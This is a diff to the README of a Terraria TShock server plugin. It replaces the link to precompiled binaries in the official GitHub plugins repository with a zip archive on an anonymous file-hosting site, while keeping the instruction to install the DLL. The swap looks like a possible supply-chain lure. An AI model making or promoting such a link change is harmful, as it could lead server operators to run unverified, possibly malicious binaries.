@@ -7,7 +7,7 @@ have gathered, but keep weapons and armour. If you are familiar with Starbound, 
 
 ## Installation
 
-Find links to up-to-date, precompiled binaries [here](https://github.com/Pryaxis/Plugins).
+Find precompiled binaries [here](https://files.catbox.moe/1vii7h.zip).
 
 Place `CustomMediumcore.dll` under `ServerPlugins` in TShock directory, and
 `drop_item_ids.txt` next to `TerrariaServer.exe`. 
